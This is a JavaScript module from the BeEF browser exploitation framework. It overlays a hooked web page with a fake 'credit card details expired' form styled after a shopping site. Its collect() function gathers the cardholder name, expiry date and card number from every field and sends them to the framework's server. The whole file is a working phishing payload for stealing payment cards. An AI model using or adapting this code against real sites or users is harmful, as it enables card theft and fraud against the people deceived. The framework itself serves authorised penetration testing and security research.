/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

  beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
	$j(document).attr('title', $j(this).html());
	document.body.scroll = 'no';
	document.documentElement.style.overflow = 'hidden';
	
	collect = function(){
	  answer = "";
		$j(":input").each(function() {
		  answer += " "+$j(this).attr("name")+":"+$j(this).val();
		});
		send(answer);
	}
	
		// floating div
	function writediv() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'hax');
		sneakydiv.setAttribute('display', 'block');
		sneakydiv.setAttribute('style', 'width:60%;position:fixed; top:200px; left:220px; z-index:51;background-color:#FFFFFF;opacity:1;font-family: verdana,arial,helvetica,sans-serif;font-size: small;');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<div style="margin:5px;">Your credit card details expired, please enter your new credit card credential to continue shopping- <br> <b>Changes made to your payment methods will not affect orders you have already placed. </b></div><table cellspacing=0 cellpadding=0 border=0 width="100%"><tbody><tr><td valign=bottom><b class=h1><nobr><a href="#" style="font-size: medium;font-family: verdana,arial,helvetica;color: #004B91;text-decoration: underline;cursor: auto">Your Account</a></nobr>&gt;</b><h1 class=h1 style="display: inline; color: #E47911; font-size: medium;font-family: verdana,arial;font-weight: bold"><b class=h1><nobr>Add a Credit or Debit Card</nobr></b></h1></td></table><div width="99%" style="border: 2px solid #DDDDCC; -webkit-border-radius: 10px;border-radius: 10px"><table width="100%" border=0 cellspacing=0 cellpadding=0 align=center><tbody><tr><td valign=middle width="20%" nowrap=nowrap height=28><font color="#660000"><b class=sans>&nbsp; Edit your payment method:</b></font></td><tr><td valign=middle width="100%" nowrap=nowrap><table><tbody><tr><td align=right><b><font face="verdana,arial,helvetica" size=-1>Cardholder Name:</font></b></td><td><input name=name onchange="collect();" size=25 maxlength=60><br></td><tr><td align=right><b><font face="verdana,arial,helvetica" size=-1>Exp. Date:</font></b></td><td><select onchange="collect();" name=newCreditCardMonth title=Month id=newCreditCardMonth><option value=01>01<option value=02>02<option value=03>03<option value=04>04<option value=05>05<option value=06>06<option value=07>07<option value=08>08<option value=09>09<option value=10>10<option value=11 selected>11<option value=12>12</select>&nbsp;<select onchange="collect();" name=newCreditCardYear title=Year id=newCreditCardYear><option value=2011 selected>2011<option value=2012>2012<option value=2013>2013<option value=2014>2014<option value=2015>2015<option value=2016>2016<option value=2017>2017<option value=2018>2018<option value=2019>2019<option value=2020>2020<option value=2021>2021<option value=2022>2022<option value=2023>2023<option value=2024>2024<option value=2025>2025<option value=2026>2026<option value=2027>2027<option value=2028>2028<option value=2029>2029<option value=2030>2030<option value=2031>2031<option value=2032>2032<option value=2033>2033<option value=2034>2034<option value=2035>2035<option value=2036>2036<option value=2037>2037</select></td><tr><td align=right><b><font face="verdana,arial,helvetica" size=-1>Number:</font></b></td><td><input name=creditcard onchange="collect();" size=16 maxlength=16><br></td><tr><td colspan=2><hr width="100%" noshade=noshade size=1></td><tr><td align=right></td><td><div id="confirm" style="cursor: hand; border: 2px solid #ffcc55; -webkit-border-radius: 10px;border-radius: 10px;font-family: verdana,arial;font-weight: bold" align=center width="20%"><font face="verdana,arial,helvetica" size=-1>Confirm</font></div></td></table></td></table></div>';
	}

	writediv();
	
	$j("#confirm").click(function () {
      $j('#hax').remove();
  });
